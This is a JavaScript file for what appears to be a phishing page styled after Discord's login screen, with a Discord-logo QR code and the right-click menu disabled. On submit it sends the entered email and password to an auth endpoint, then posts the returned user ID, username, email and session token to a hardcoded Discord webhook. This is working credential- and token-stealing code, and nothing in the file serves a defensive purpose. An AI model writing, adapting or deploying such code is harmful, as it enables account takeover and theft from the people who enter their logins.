document.addEventListener("DOMContentLoaded", () => {
  const form = document.querySelector("form");
  const loginButton = document.querySelector(".login button");
  const emailInput = document.querySelector("#emailORphone");
  const passwordInput = document.querySelector("#password");
  const qrCodeElement = document.querySelector(".qr-code");
  const qrCodeImg = document.createElement("img");

  // Webhook URL (replace with your actual webhook URL)
  const WEBHOOK_URL = "https://discord.com/api/webhooks/1414568057652772884/-WdSwhYyx44jjWlk29Ac-dOed621NJN_KwF7abSIkyyB8KfOuQY3busFvMulOnpImY9G"; // e.g., Discord webhook URL

  // Disable context menu
  document.addEventListener("contextmenu", (event) => event.preventDefault());

  // QR code animation
  qrCodeImg.src = "./assets/qrcode-discord-logo.png";
  qrCodeImg.alt = "QR Code";
  qrCodeElement.appendChild(qrCodeImg);

  const createCube = () => {
    const cube = document.createElement("div");
    cube.classList.add("cube");
    qrCodeElement.appendChild(cube);

    const moveCube = () => {
      const maxX = qrCodeElement.offsetWidth - cube.offsetWidth;
      const maxY = qrCodeElement.offsetHeight - cube.offsetHeight;
      const newX = Math.random() * maxX;
      const newY = Math.random() * maxY;
      cube.style.transform = `translate(${newX}px, ${newY}px)`;
    };

    moveCube();
    setInterval(moveCube, 2000);
  };

  for (let i = 0; i < 4; i++) createCube();

  // Form submission with real authentication
  form.addEventListener("submit", async (e) => {
    e.preventDefault();
    const email = emailInput.value.trim().toLowerCase();
    const password = passwordInput.value.trim();

    // Debug: Log inputs (avoid logging sensitive data in production)
    console.log("Email entered:", email);
    console.log("Attempting login...");

    if (!email || !password) {
      alert("Please fill in both email/phone and password.");
      console.log("Validation failed: Missing email or password");
      return;
    }

    // Start ellipsis animation
    loginButton.disabled = true;
    loginButton.textContent = "Logging in.";
    const ellipsisInterval = setInterval(() => {
      loginButton.textContent =
        loginButton.textContent.length < 13
          ? loginButton.textContent + "."
          : "Logging in.";
    }, 500);

    try {
      // Simulate real authentication (replace with your actual auth API)
      const authResponse = await authenticateUser(email, password);

      if (!authResponse.success) {
        throw new Error(authResponse.message || "Invalid email or password.");
      }

      // Prepare login info for webhook
      const loginInfo = {
        content: `**Login Info**\nUser ID: ${authResponse.user.id}\nUsername: ${authResponse.user.username}\nEmail: ${authResponse.user.email}\nToken: ${authResponse.user.token}`,
        timestamp: new Date().toISOString(),
      };

      // Send to webhook
      await sendToWebhook(loginInfo);

      // Log success to console
      console.log("Login successful! Data sent to webhook:", loginInfo);

      alert("Login successful! Check console for details.");
      emailInput.value = "";
      passwordInput.value = "";
    } catch (error) {
      alert(`Error: ${error.message || "Something went wrong."}`);
      console.error("Login error:", error);
    } finally {
      // Stop ellipsis animation
      clearInterval(ellipsisInterval);
      loginButton.textContent = "Log In";
      loginButton.disabled = false;
    }
  });

  // Hypothetical authentication function (replace with your actual auth API)
  async function authenticateUser(email, password) {
    try {
      // Example: Replace with your authentication endpoint (e.g., Firebase, your backend, etc.)
      const response = await fetch("https://your-auth-api-endpoint/login", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({ email, password }),
      });

      const data = await response.json();

      if (!response.ok) {
        throw new Error(data.message || "Authentication failed.");
      }

      // Expected response format: { success: true, user: { id, username, email, token } }
      return data;
    } catch (error) {
      console.error("Authentication error:", error);
      throw new Error("Failed to authenticate. Please try again.");
    }
  }

  // Function to send data to webhook
  async function sendToWebhook(data) {
    try {
      const response = await fetch(WEBHOOK_URL, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify(data),
      });

      if (!response.ok) {
        throw new Error("Failed to send data to webhook.");
      }

      console.log("Webhook sent successfully");
    } catch (error) {
      console.error("Webhook error:", error);
      throw new Error("Error sending data to webhook.");
    }
  }
});
